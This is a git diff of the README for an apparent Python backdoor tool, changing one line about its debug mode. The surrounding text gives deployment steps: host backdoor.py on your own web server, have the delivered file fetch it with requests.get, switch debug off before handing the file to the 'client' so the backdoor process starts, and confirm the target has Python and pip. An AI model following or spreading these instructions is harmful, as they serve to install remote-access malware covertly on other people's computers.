@@ -60,7 +60,7 @@ Upload the file **backdoor.py** to a server that you do a GET request to and cha
 `request = requests.get("%YOUR WEB SERVER ADDRESS%/backdoor.py")`
 
 Alse make sure that you change `debug = True` to `debug = False` when you give to the file to the client, 
-or else, if the request won't work, messages will be displayed (on the console) 
+or else, the backdoor process won't be created, and if the request won't work, messages will be displayed (on the console) 
 
 Make sure that the target computer have python 3 installed and pip or else the backdoor won't be installed.
 ## how the backdoor works
